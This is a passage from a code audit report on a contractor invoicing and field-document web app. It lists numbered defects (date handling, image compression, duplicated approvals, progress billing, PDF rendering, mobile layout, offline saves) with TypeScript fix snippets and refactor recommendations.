  3. `parseDate` uses `new Date('03/04/2024')` (US M/D order) and then `toISOString()`. In UTC+ timezones (Morocco is UTC+1) local midnight becomes the previous day, so receipts dated D/M are wrong or shifted by one day.
  4. `parseAmount` takes the **largest** dollar amount, which is often the cash tendered rather than the total.
  5. If the AI supplies `tax: "5"`, then `subtotal + "5"` is a string and `amount.toFixed` crashes the form.
- **Fix:**
  ```ts
  // effect: only auto-sum when there are real items
  useEffect(() => {
    const items = (formData.lineItems || []).filter(li => li.description || toNum(li.rate));
    if (!items.length) return;
    const total = round2(items.reduce((s, li) => s + toNum(li.rate) * toNum(li.quantity, 1), 0) + toNum(formData.tax));
    setFormData(prev => (prev.amount === total ? prev : { ...prev, amount: total }));
  }, [formData.lineItems, formData.tax]);
  // OCR: write vendor fields, not company fields
  - setFormData(prev => ({ ...prev, companyName: ocrResult.vendor || prev.companyName }));
  + setFormData(prev => ({ ...prev, vendor: ocrResult.vendor || prev.vendor }));
  // ocr.ts parseDate: build the ISO date without timezone conversion
  const iso = (y: number, m: number, d: number) => `${y}-${String(m).padStart(2,'0')}-${String(d).padStart(2,'0')}`;
  // for a/b/yyyy: if a > 12 → D/M, else use the profile locale (dayFirst = !navigator.language.startsWith('en-US'))
  // parseAmount: prefer /(grand\s*)?total|amount\s*due|balance/ line; fall back to the max only if none
  ```

### DOC-021: Image compression turns transparent PNG logos black; HEIC and upload failures are silent
- **Severity:** Medium
- **Status:** CONFIRMED
- **Location:** `utils/imageCompression.ts:25-47`; `App.tsx:1982-1991`; every `handleLogoChange` (for example `InvoiceForm.tsx:162-180`)
- **What's wrong:** Files over 200 KB are redrawn on a transparent canvas and exported as **JPEG**, which turns transparent pixels black. Logos on white templates get a black box. Formats the browser cannot decode (HEIC from iPhones) reject; `handleUploadDocumentImage` returns `''`, and the form silently ignores it.
- **Fix:**
  ```ts
  const hasAlpha = /png|webp|gif/i.test(file.type);
  const ctx = canvas.getContext('2d')!;
  if (!hasAlpha) { ctx.fillStyle = '#ffffff'; ctx.fillRect(0, 0, width, height); }
  ctx.drawImage(img, 0, 0, width, height);
  const type = hasAlpha ? 'image/webp' : 'image/jpeg';   // WebP keeps alpha and compresses well
  canvas.toBlob(cb, type, quality);
  // App.handleUploadDocumentImage: surface failures
  catch (e) { alert('Image upload failed. Please use a JPG or PNG under 10 MB.'); throw e; }
  ```
  jsPDF 2.5.1 supports WEBP in `addImage` (`loadImage` already detects it). Alternatively keep PNG for alpha images.

### DOC-022: Date defaults use UTC and are frozen at module load; document numbers are not unique
- **Severity:** Medium
- **Status:** CONFIRMED
- **Location:**
  - `InvoiceForm.tsx:30-48` (module-level `defaultInvoice`: `INV-YYYY-MM-001` for every invoice, one shared line-item id)
  - `DailyJobReportForm.tsx:57-67` (`DR-…-001`), `ChangeOrderForm.tsx:36` (`CO-…-001`)
  - `Math.random()*1000` in Estimate, WO, Warranty and PO numbers
  - `toISOString().split('T')[0]` in all 12 forms
- **What's wrong:**
  - After 7 pm in New York (UTC−5) the default date is **tomorrow**; before 1 am in Casablanca (UTC+1) it is yesterday.
  - Because `defaultInvoice` is evaluated once at import, a tab left open overnight keeps yesterday's dates and month.
  - Invoice numbers collide (every invoice is `…-001`), and random 0-999 suffixes collide too.
- **Fix:**
  ```ts
  // utils/dates.ts
  export const localISODate = (d = new Date()) => { const z = new Date(d.getTime() - d.getTimezoneOffset() * 60000); return z.toISOString().slice(0, 10); };
  export const addDays = (n: number) => localISODate(new Date(Date.now() + n * 86400000));
  // utils/docNumbers.ts: next number from existing docs of the same type
  export const nextDocNumber = (prefix: string, existing: string[]) => {
    const ym = localISODate().slice(0, 7).replace('-', '-');
    const re = new RegExp(`^${prefix}-${ym}-(\\d+)$`);
    const max = existing.reduce((m, s) => Math.max(m, Number(s.match(re)?.[1] || 0)), 0);
    return `${prefix}-${ym}-${String(max + 1).padStart(3, '0')}`;
  };
  ```
  Turn `defaultInvoice` into a factory `makeDefaultInvoice()` called inside `useState(() => …)`. Pass the existing numbers from App (`forms.map(f => f.data.invoiceNumber)`). A DB unique index on `(user_id, data->>'invoiceNumber')` is the robust long-term version.

### DOC-023: The "Recurring Schedule" UI does nothing; duplicates copy the schedule
- **Severity:** Medium
- **Status:** CONFIRMED
- **Location:** `InvoiceForm.tsx:498-547`; `services/recurringService.ts:6` (`processRecurringInvoices` is **never imported**); `App.tsx:2182-2196, 2241`
- **What's wrong:** The UI says "A new draft invoice will be automatically created on this date". Nothing runs. Even if wired, it would read `forms` (lightweight, without `recurrence`). Duplicating an invoice copies `recurrence.enabled`, so wiring it later would double-bill.
- **Fix:** Run the schedule server-side (a Supabase scheduled Edge Function or `pg_cron`) that queries `documents where type='Invoice' and (data->'recurrence'->>'enabled')::bool and (data->'recurrence'->>'nextRunDate')::date <= current_date`. In both duplicate handlers add `recurrence: d.recurrence ? { ...d.recurrence, enabled: false } : undefined`. Until the server job exists, hide the section behind a feature flag.

### DOC-024: Debug buttons ship to users and overwrite real data
- **Severity:** Medium
- **Status:** CONFIRMED
- **Location:** `InvoiceForm.tsx:238-271, 553-559`; `EstimateForm.tsx:327-359, 425-431`; `DailyJobReportForm.tsx:427-449, 966-972`
- **What's wrong:** "Test AI Infographics" / "Test Rich Text" replace the client name, address, notes and line items with hard-coded mock data ("Al-Amal Logistics…") after 1.5 s. One mis-tap and the next save writes the mock data.
- **Fix:** Wrap them in `{import.meta.env.DEV && (…)}`, or delete them together with `handleTestAI`.

### DOC-025: "Quick Add to Price Book" buttons are dead
- **Severity:** Medium
- **Status:** CONFIRMED
- **Location:** `InvoiceForm.tsx:627-635`; `EstimateForm.tsx:490-498`; `App.tsx:3006, 3012` (no `onSaveToPriceBook` prop)
- **Fix:**
  ```tsx
  // App.tsx renderForm
  onSaveToPriceBook={async (item) => { await handleAddSavedItem({ ...item, name: item.name?.trim() || 'Untitled item' }); }}
  // forms: disable when description is empty and show a toast on success
  ```

### DOC-026: Prefill pollutes saved documents and puts HTML into plain-text fields
- **Severity:** Medium
- **Status:** CONFIRMED
- **Location:**
  - `...prefillData` in every prefill effect (for example `InvoiceForm.tsx:120`, `EstimateForm.tsx:126`, `WorkOrderForm.tsx:79`)
  - `description_html` into textareas/inputs: `WorkOrderForm.tsx:80`, `TimeSheetForm.tsx:81`, `ExpenseLogForm.tsx:93`, `WarrantyForm.tsx:58`, `ReceiptForm.tsx:76`, `ChangeOrderForm.tsx:91`, `InvoiceForm.tsx:116`
  - `InvoiceForm.tsx:50-54`, `EstimateForm.tsx:31-35` (`extractPromptNotes`)
  - `InvoiceForm.tsx:132` (`|| true`)
- **What's wrong:**
  - Control fields (`auto_submit: true`, `ai_open_mode`, `start_page`, `rawInput` with the user's full prompt, `document_metadata`, `template_style`, …) are saved inside every AI-drafted document's JSON.
  - AI rich HTML (`<h3>…</h3><ul>…`) appears literally in plain textareas and is printed verbatim in jsPDF output.
  - The notes regex `/\bnotes?\s*(?:is|:)?\s*(.+?)/` has no trailing word boundary, so "3 **note**books" sets the notes to "books …" and overrides the AI's notes.
- **Fix:**
  ```ts
  const CONTROL_KEYS = ['ai_open_mode','auto_submit','start_page','rawInput','document_metadata','template_style','templateDescription','description_html','isAiDrafted','__draftId'];
  const stripControl = (pf: any) => Object.fromEntries(Object.entries(pf).filter(([k]) => !CONTROL_KEYS.includes(k)));
  const htmlToText = (h?: string) => (h || '').replace(/<\/(p|h\d|li|div)>/gi, '\n').replace(/<br\s*\/?>/gi, '\n').replace(/<[^>]+>/g, '').replace(/\n{3,}/g, '\n\n').trim();
  // in each form: { ...prev, ...stripControl(pf), description: htmlToText(pf.description_html) || pf.description || prev.description, isAiGenerated: true }
  // extractPromptNotes:
  /\bnotes?\b\s*(?:is|:)\s*(.+?)(?=\s+review\b|\s+do\s+not\s+save\b|$)/i   // require "note:" / "notes is"
  ```

### DOC-027: The daily-report setup signature is attached to every AI draft in the session
- **Severity:** Medium
- **Status:** CONFIRMED
- **Location:** `App.tsx:1101-1107`; only `DailyJobReportForm.tsx:268-273` removes the key
- **What's wrong:** A signature captured "for the daily report" (`SetupSignatureModal` copy) is read from `sessionStorage` for *every* payload and applied as `signatureUrl` on invoices, estimates, POs and so on, then persisted. Users see their signature on documents they never signed.
- **Fix:** Apply it only when `payload.formType === FormType.DailyJobReport` (or when the user opted in for that draft), and remove the key right after reading it in `queueAIDraftsFromPayload`.

### DOC-028: PDF output does not match the screen or the captured fields (several types)
- **Severity:** Medium
- **Status:** CONFIRMED
- **Location and problems:**
  - Warranty `pdfGenerator.ts:1246-1308`: ignores `logoUrl` (the form explicitly offers "override logo for this document"), company name and address, `templateId` layout (only the primary color is used) and `ai_visual_data`.
  - Receipt `1376-1417`: always prints "PAID IN FULL" even for partial payments; no company or contact block although the form edits it; description not wrapped.
  - Material Log `1155-1190`: captured signature never drawn; no on-screen total in the form.
  - Daily Report (standard templates) `1047-1103`: no company or client block, while the on-screen preview (`buildStandardDailyReportPreviewHtml`, `DailyJobReportForm.tsx:118-154`) shows both. Prints `Weather: ' / '` because the form has no weather or temperature inputs.
  - Purchase Order: `status`, `notes` and `vendorEmail` exist in the type and in AI prefill but have no input and are not printed; the `'Custom'` ship-to type is unreachable.
  - Work Order and Change Order: `ai_visual_data` is stored (prefill) but neither shown nor printed.
- **Fix:** Use `drawDocumentHeader` + `drawContactGrid` for Warranty and Receipt. Add a `status` field to `ReceiptData` (`'Paid in full' | 'Partial' | 'Deposit'`) and print it. Draw the signature in Material Log using the Estimate block (`pdfGenerator.ts:782-800`). Add weather and temperature inputs to Daily Report page 1 and print the line only when set:
  ```ts
  if (data.weather || data.temperature) { doc.text('Weather:', 120, y); doc.text([data.weather, data.temperature].filter(Boolean).join(' / '), 140, y); }
  ```
  Add PO status/notes/vendor-email inputs and print notes under the table.

### DOC-029: Duplicating documents and jobs copies approvals, inventory flags and recurrence; DuplicateJobModal resets while open
- **Severity:** Medium
- **Status:** CONFIRMED
- **Location:** `App.tsx:2174-2213` (doc), `2215-2273` (job), `3210-3217`; `DuplicateJobModal.tsx:28-35`
- **What's wrong:**
  - Job duplication copies `clientSignatureUrl`, `clientSignedAt` and `clientSignedBy`, so the new estimate shows "Approved digitally" by the old client.
  - It also copies `deductInventory: true` (with DOC-002 this deducts again) and `recurrence`. Doc duplication clears `clientSignatureUrl` only, not `clientSignedAt/By`.
  - `status: 'Draft'` is forced on Work Orders and Time Sheets, which have no Draft option.
  - `forms={forms.filter(...)}` is a new array on every App render, so the modal's `useEffect([isOpen, job, forms, clients])` resets the typed job name and the document checkboxes.
  - Only the first page of the job's documents (the loaded ones) is listed.
  - There is no busy state, so a double-click duplicates the job twice. Insert errors are ignored.
- **Fix:**
  ```ts
  const scrubForCopy = (d: any, type: FormType) => {
    const { clientSignatureUrl, clientSignedAt, clientSignedBy, viewedByProvider, inventoryDeductedAt, ...rest } = d;
    return { ...rest, deductInventory: false,
      recurrence: d.recurrence ? { ...d.recurrence, enabled: false } : undefined,
      status: ({ [FormType.Invoice]: 'Draft', [FormType.Estimate]: 'Draft', [FormType.PurchaseOrder]: 'Draft', [FormType.WorkOrder]: 'Scheduled' } as any)[type] ?? d.status };
  };
  // DuplicateJobModal: initialize only when it opens
  useEffect(() => { if (isOpen && job) { /* init */ } }, [isOpen, job?.id]);
  // App: pass a memoized list and load all doc ids for the job (select id,type,title only, no pagination)
  ```

### DOC-030: Progress billing ignores previously billed amounts; percent semantics are inconsistent
- **Severity:** Medium
- **Status:** LIKELY (business logic)
- **Location:** `InvoiceForm.tsx:356-367, 595, 665-673`; `pdfGenerator.ts:583-595`; `types.ts:133-136` (`previouslyBilled`, `progressValue` unused)
- **What's wrong:** The column is labelled "% Complete" (cumulative), the PDF says "% Billed", and the amount = scheduled × pct. On the second progress invoice for the same job (30% → 60%), the contractor bills 60% again instead of 30%. `previouslyBilled` exists but is never populated or subtracted.
- **Fix:** Use `lineAmount` from the shared helper (it subtracts `previouslyBilled`). When creating a progress invoice, prefill `previouslyBilled` per line from earlier invoices of the same job, and show columns "Scheduled | % Complete | Previously Billed | This Period" in both the form and the PDF.

### DOC-031: Mobile layout problems in line items, floating buttons, image resizing and the signature pad
- **Severity:** Medium
- **Status:** CONFIRMED (CSS math)
- **Location:** `InvoiceForm.tsx:589-610` (`grid-cols-12`, description `col-span-4` holding an input + two 40 px icon buttons ≈ 110 px total on a 375 px phone, leaving roughly 30 px for the input); `EstimateForm.tsx:468-479`; `ChangeOrderForm.tsx:389-394`; `EstimateForm.tsx:456-463` (fixed `bottom-6 right-4 z-50` button over the page footer and dock); `DailyJobReportForm.tsx:830-864` and `NoteForm.tsx:509-550` (resize with mouse events only); `SignaturePad.tsx:25-58` (canvas sized once, no `resize` listener, no devicePixelRatio; a saved image is stretched to the current canvas size and re-saved distorted).
- **Fix:**
  ```tsx
  // line item row: stack on mobile
  <div className="grid grid-cols-6 sm:grid-cols-12 gap-2 items-center border-b sm:border-0 pb-3 sm:pb-0">
    <div className="col-span-6 sm:col-span-5 flex gap-1">…description + icons…</div>
    <div className="col-span-2 sm:col-span-2">qty</div>
    <div className="col-span-2 sm:col-span-2">rate</div>
    <div className="col-span-2 sm:col-span-2 text-right">amount</div>
    <div className="hidden sm:block sm:col-span-1">×</div>
  </div>
  ```
  ```ts
  // SignaturePad: DPR-aware, resize-aware, aspect-preserving redraw
  const dpr = window.devicePixelRatio || 1;
  const fit = () => { const w = parent.clientWidth; canvas.width = w * dpr; canvas.height = 200 * dpr;
    canvas.style.width = w + 'px'; canvas.style.height = '200px'; ctx.setTransform(dpr, 0, 0, dpr, 0, 0); redraw(); };
  const ro = new ResizeObserver(fit); ro.observe(parent); return () => ro.disconnect();
  // redraw: draw the image with contain-fit, not stretched to w x h
  ```
  Use pointer events (`onPointerDown/Move/Up`) for the image resize handles so touch works.

### DOC-032: DailyJobReportForm crashes on a null client name, and there is no ErrorBoundary anywhere
- **Severity:** Medium
- **Status:** LIKELY
- **Location:** `DailyJobReportForm.tsx:313-314, 907`; `jobs.client_name TEXT` nullable (`App.tsx:208`); the AI edge function writes `clientName: jobDetails?.client_name` (possibly null) into saved documents (`supabase/functions/process-contractor-ai/index.ts:176-181`)
- **What's wrong:** `data.clientName.trim()` / `job.clientName.trim()` throw on null. With no error boundary (none in the repo), the whole app goes white.
- **Fix:** Use `(data.clientName || '').trim()` and `(job.clientName || '').trim()`, and wrap `renderForm()` in an error boundary:
  ```tsx
  class FormErrorBoundary extends React.Component<{ onBack: () => void; children: React.ReactNode }, { err?: Error }> {
    state: { err?: Error } = {};
    static getDerivedStateFromError(err: Error) { return { err }; }
    render() { return this.state.err
      ? <div className="p-6"><h2 className="font-bold">This document could not be displayed.</h2><pre className="text-xs">{this.state.err.message}</pre><Button onClick={this.props.onBack}>Back</Button></div>
      : this.props.children; }
  }
  // <FormErrorBoundary key={componentKey} onBack={handleCloseForm}>{form}</FormErrorBoundary>
  ```

### DOC-033: Performance: previews rebuilt on every keystroke, 20-30 template iframes, base64 photos inside document JSON
- **Severity:** Medium
- **Status:** CONFIRMED
- **Location:** `DailyJobReportForm.tsx:200-223, 1009` (`templatePreviewHtml` depends on `data`, and `syncEditorContent` updates `data.content` on every input, so the iframe `srcDoc` reloads on every keystroke); `TemplateSelector.tsx:229-267, 303-345` (one iframe per card; the Gradient template triggers a Google Fonts `@import` per iframe); `DailyJobReportForm.tsx:577-601`, `NoteForm.tsx:327-349` (photos inserted as data URLs into `content`, which is saved in `documents.data` and re-downloaded on every open and email)
- **Fix:** Debounce the preview with `useDeferredValue(data.content)` or a 400 ms debounce, and render it only when expanded. In `TemplateSelector`, render static PNG thumbnails (pre-generated once) or lazy-mount iframes with `IntersectionObserver`. Upload editor photos with `onUploadImage` and insert the public URL instead of base64:
  ```ts
  const url = await onUploadImage?.(compressed);
  insertImageIntoEditor(url || await fileToDataUrl(compressed));
  ```
  (DailyReport receives `onUploadImage`; NoteForm needs it added in `App.tsx:3008`.)

### DOC-034: The AI widget library is never rendered and not printed; the allow-lists conflict; widgets are unguarded
- **Severity:** Medium
- **Status:** CONFIRMED
- **Location:**
  - `components/DocumentWidgets/DocumentWidgetRenderer.tsx` (no importer anywhere)
  - `AIVisualComponents.tsx:108-122` (renders only `metrics/progress/chart`)
  - `documentHtmlTemplates.ts:7-59` (`getAIVisualHtml` ignores `widgets`)
  - `widgetConfig.ts:7-60` vs `src/config/widgetMap.ts` (different allow-lists; the renderer uses the latter)
  - widgets destructure without defaults (`LaborShiftLog.tsx:20, 32`, `BudgetDonut.tsx:19-28` divides by `total`)
- **What's wrong:** `ai_visual_data.widgets` produced by the AI is stored but never shown, on screen or in the PDF. If the renderer were wired up as is, a missing array would crash (`shifts.map` of undefined) and take down the page.
- **Fix:** Render `DocumentWidgetRenderer` in place of `AIVisualDisplay` in Invoice/Estimate, and add it to DailyReport/WO/CO. Wrap each widget in a per-widget error boundary and default the props (`const { shifts = [], total_hours = 0 } = data ?? {}`). Delete `widgetConfig.ts`'s map, or re-export it from `src/config/widgetMap.ts`. For the PDF, either render the widget DOM off-screen and capture it with `renderHtmlToPdf`, or extend `getAIVisualHtml` to cover the common widgets.

### DOC-035: No unsaved-changes protection; offline saves fail although the UI advertises an offline mode
- **Severity:** Medium
- **Status:** CONFIRMED / LIKELY
- **Location:** every header back arrow and Cancel (for example `InvoiceForm.tsx:551, 1022`); `App.tsx:2124-2131`; `App.tsx:2542` ("OFFLINE MODE" badge); `App.tsx:1352-1355` (`syncOfflineData` is a stub)
- **What's wrong:** Back or Cancel discards the work with no prompt. Offline, `upsert` fails with "Save failed: Failed to fetch". There is no local draft or queue, so a contractor on a site without signal loses the document.
- **Fix:** Track `isDirty` (compare `JSON.stringify(state)` with the initial snapshot). Confirm on back and add a `beforeunload` handler. Persist drafts to IndexedDB (`dbApi` exists): `dbApi.put('draft_documents', {key: location.key, formType, jobId, data})` every 2 s while dirty, restore on mount, and flush the queue in `syncOfflineData`.

### DOC-036: Glassmorphism shows "Invalid Date" and uses profile data instead of document data; several templates use CSS html2canvas cannot render
- **Severity:** Low
- **Status:** CONFIRMED (Invalid Date in the harness)
- **Location:** `documentHtmlTemplates.ts:208, 248, 279` (`new Date(data.date)`; invoices and estimates have `issueDate`); `244, 253-256` (`profile.logoUrl`, `profile.companyName`, … ignore the per-document overrides); `292` (black header text on the primary background, unreadable with dark colors); `690` (`@import` Google font inside the content); `693` and `allNewTemplates.ts:153-270` (`clip-path`); `238, newHtmlTemplates.ts:222, secondSetTemplates.ts:413` (`backdrop-filter`); logo `filter: brightness(0) invert(1)` in several templates. html2canvas 1.4.1 ignores `clip-path`, `backdrop-filter` and `filter`, so the shapes render as plain rectangles.
- **Fix:** `const formattedDate = labels.dateValue;`. Use `data.logoUrl || profile.logoUrl` and the `companyName` fallback chain used by the other templates. Header text `color:#fff`. Remove `@import`, `clip-path`, `backdrop-filter` and `filter`, or pre-render those shapes as inline SVG.

### DOC-037: Item picker leaves stale data on a line
- **Severity:** Low
- **Status:** CONFIRMED
- **Location:** `InvoiceForm.tsx:274-338`, `EstimateForm.tsx:212-262`, `ChangeOrderForm.tsx:194-244`
- **What's wrong:** Picking an inventory item keeps the previous `rate` (`rate: lineItem.rate || cost_price`), so a line that had a $500 price-book service keeps $500. It also does not clear `isAssembly` or `assemblyComponents` from an earlier price-book assembly pick, so "View Kit Contents" still shows the old kit. Invoice price-book picks drop `unit_cost`, so profit data is lost. Inventory picks default the selling price to *cost* (`cost_price`), which bills at zero margin.
- **Fix:**
  ```ts
  { ...lineItem, description: invItem.name, rate: Number(invItem.cost_price || 0) * (1 + (profile.defaultMarkup ?? 0) / 100),
    unitCost: Number(invItem.cost_price || 0), isAssembly: false, assemblyComponents: [], hideComponentsOnPdf: false, ... }
  // price book pick (Invoice): unitCost: item.unit_cost ?? item.cost ?? 0
  ```

### DOC-038: Totals validation and rounding
- **Severity:** Low
- **Status:** CONFIRMED
- **Location:** `InvoiceForm.tsx:369-374` (discount larger than subtotal gives a negative tax and total); negative quantity and rate allowed in every line-item form; totals are summed from unrounded floats while each line is displayed rounded (cent drift); Estimate has no tax or discount (`EstimateForm.tsx:281`); table rows/cols `Math.max(1, parseInt(''))` gives NaN (`DailyJobReportForm.tsx:1089-1093`, `NoteForm.tsx:574-578`).
- **Fix:** Use `computeDocumentTotals` (it clamps the discount and rounds per line). Add `min={0}` and `step="0.01"` on inputs. For table size use `Math.max(1, parseInt(v, 10) || 1)`. Consider giving Estimates `taxRate` and `discount` so they convert cleanly into invoices.

### DOC-039: "Get Approval Link" UX
- **Severity:** Low
- **Status:** CONFIRMED
- **Location:** `EstimateForm.tsx:300-311`, `ChangeOrderForm.tsx:262-273`
- **What's wrong:** For an unsaved document it alerts, then saves, which navigates away, so the user never gets a link and must reopen the document. `navigator.clipboard.writeText` is not awaited or caught (it fails on non-secure origins and in some iOS contexts), and "Copied" shows anyway.
- **Fix:** Save with `{ stay: true }` (DOC-007 option), read the `public_token` from the upsert (`.select('public_token').single()`), then `try { await navigator.clipboard.writeText(link) } catch { window.prompt('Copy this link', link) }`.

### DOC-040: `renderHtmlToPdf` robustness
- **Severity:** Low
- **Status:** LIKELY
- **Location:** `pdfGenerator.ts:78-380`
- **What's wrong:**
  - A single shared `#pdf-render-content` container: two generations at once (for example a batch email while the user downloads) clear each other's DOM.
  - Pages are cut at fixed heights, so text lines and table rows are sliced across pages.
  - One tall canvas at `scale:2` (1588 px wide) exceeds the iOS Safari canvas area limit (about 16.7 Mpx) beyond roughly 5 pages, which gives blank or failed PDFs on iPhones.
  - The `li p, li div { position:relative; top:-15px }` hack shifts list text upward and overlaps it.
  - `await Promise.all(images…)` has no timeout, so one hanging image freezes the download.
- **Fix:** Create a per-call container (or the sandboxed iframe from DOC-013). Before slicing, compute break points from the element layout: collect the `getBoundingClientRect().bottom` of block children and cut at the last boundary that fits. Render page-sized chunks with `html2canvas(container, { y, height: pagePx, windowHeight: pagePx })` instead of one giant canvas, and use `scale: Math.min(2, window.devicePixelRatio)` on mobile. Remove the `top:-15px` rule. Add `Promise.race([load, timeout(5000)])` for images.

### DOC-041: Color handling
- **Severity:** Low
- **Status:** CONFIRMED
- **Location:** `pdfGenerator.ts:411-414` (`hexToRgb` rejects `#abc` and named colors and falls back to black, while AI may return `"red"` or `#f00`); `themeColors.secondary` is never used by any jsPDF template; `TemplateSelector.tsx:349` hides the pickers for documents without `themeColors` (older documents).
- **Fix:** Normalize colors at prefill and save time (`safeColor` + expand 3-digit hex), default `themeColors` in `TemplateSelector` (`themeColors ?? { primary:'#000000', secondary:'#666666' }`), and use the secondary color for jsPDF section headings.

### DOC-042: Minor defects
- **Severity:** Low
- **Status:** CONFIRMED
- **Items:**
  - `pdfGenerator.ts:1346`: the Note PDF "Created" date is *today*, not the note's creation date. Pass `createdAt` through.
  - `DocumentCard.tsx:18`: the title fallback ignores `receiptNumber` (App's lightweight mapper includes it). `getDocIcon` returns the invoice icon for 8 of the 12 types.
  - `DailyJobReportForm.tsx:257`: `tsc` error TS2339 `clientId` not in `Partial<DailyJobReportData>`. Add `clientId?: string` to `DailyJobReportData` in `types.ts`.
  - `hooks/useDocumentDraftPrefill.ts`: unused (`useDocumentDraftPrefill`, `mapLineItemsForForm`). Adopt it (DOC-004) or delete it.
  - `utils/dailyReportSetup.ts:56-60`: unreachable branch (`templateId` is always added just above).
  - `SetupSignatureModal.tsx:100`: when the user both draws and types, the drawn signature silently wins. Disable one input when the other is used.
  - `utils/ocr.ts:6-16, 433`: the Tesseract worker is created once and never terminated (about 10 MB of memory). Call `terminateOCRWorker()` on ExpenseLogForm unmount.
  - `ConfirmationModal.tsx:60-63`: `onConfirm()` is not awaited and the delete handlers ignore Supabase errors (`App.tsx:2275-2281`), so failed deletes look successful.

---

## 4. Recommended refactors (only those that matter)

### 4.1 One money module, used everywhere (fixes DOC-001, 015, 017, 018, 030, 038)
Put `utils/documentTotals.ts` (above) behind the forms, the jsPDF generators, the HTML templates and ShareModal. Add unit tests:

```ts
// utils/documentTotals.test.ts
expect(computeDocumentTotals({ lineItems:[{quantity:2,rate:100}], discount:20, taxRate:10, shipping:5 }).total).toBe(203);
expect(computeDocumentTotals({ isProgressBilling:true, lineItems:[{quantity:1,rate:10000,percentComplete:50}] }).total).toBe(5000);
```

### 4.2 One template registry and one HTML render path (fixes DOC-009, 010, 011, 013, 036)
- `utils/templates/registry.ts` exports `HTML_TEMPLATES`, `STANDARD_TEMPLATES`, and `supportsPremium(formType)`. `TemplateSelector`, `DailyJobReportForm` (which currently keeps its own `HTML_TEMPLATE_RENDERERS` copy) and `pdfGenerator` (which keeps four hand-copied `if (templateId === …)` ladders) all import it.
- `pdfGenerator.renderHtmlDocument(kind, data, profile, title, labels)` does: escape → `prepareTemplateData` → template or adapter → append the extras block → render in a sandboxed iframe → paginate.
- Add a template contract test (extend the harness used for this audit into a Vitest suite). For each template × {invoice, estimate, daily report, note}, assert: no `undefined`/`NaN`/`Invalid Date`, the total equals `computeDocumentTotals().total`, the signature is present, the content marker is present exactly once, and the AI visuals appear exactly once.

### 4.3 A `useDocumentForm` hook to remove the duplicated form plumbing (fixes DOC-004, 005, 006, 007, 019, 022, 026, 035)
All 12 forms repeat: initial state from profile/job, profile sync, prefill, save/download/save-and-download, logo upload and client select. Sketch:

```ts
export function useDocumentForm<T extends object>(opts: {
  initial: T | null; makeDefaults: () => T; prefillData?: any;
  mapPrefill: (prev: T, pf: any) => T; onSave: (d: T) => Promise<void>;
  download: (d: T) => Promise<void>;
}) {
  const [data, setData] = useState<T>(() => opts.initial ?? opts.makeDefaults());
  const dataRef = useRef(data); dataRef.current = data;
  const initialSnap = useRef(JSON.stringify(data));
  const isDirty = JSON.stringify(data) !== initialSnap.current;

  useApplyPrefillOnce(opts.prefillData, (pf) => {
    const next = opts.mapPrefill(dataRef.current, stripControl(pf));
    setData(next);
    if (pf.auto_submit) { const t = setTimeout(() => opts.onSave(next), 1000); return () => clearTimeout(t); }
  });

  const [save, saving] = useAsyncAction(() => opts.onSave(dataRef.current));
  const [download, downloading] = useAsyncAction(() => opts.download(dataRef.current));
  const saveAndDownload = async () => { await download(); await save(); };
  useEffect(() => {
    const h = (e: BeforeUnloadEvent) => { if (isDirty) { e.preventDefault(); e.returnValue = ''; } };
    window.addEventListener('beforeunload', h); return () => window.removeEventListener('beforeunload', h);
  }, [isDirty]);
  return { data, setData, save, saving, download, downloading, saveAndDownload, isDirty };
}
```

Each form becomes its field JSX plus a `mapPrefill` function. Profile backfill belongs in `makeDefaults`, not in an effect.

### 4.4 App-level save contract (fixes DOC-002, 005, 007, 008, 016)
- `handleSaveForm(data, { stay?: boolean }): Promise<{ id: string; public_token?: string }>`, with a stable callback (`useCallback` + ref) and an idempotent id per `location.key`.
- Never call `fetchData()` from per-entity handlers. Merge, don't replace, the `forms` list. Keep full documents in a separate `documentCache: Map<id, FormData>` so list refreshes cannot evict an open document.
- Inventory movements only through the `decrement_inventory` RPC, after a successful save.

### 4.5 Field-level validation on save
A small schema per document type (zod is light), run in `handleSaveForm`. Minimum rules: required number and date, numeric fields finite and ≥ 0, at least one non-empty line item for Invoice/Estimate/PO/CO, and dates in valid order (due ≥ issue, expiry ≥ issue). Show the errors inline instead of saving `null` numbers that later crash the PDF.
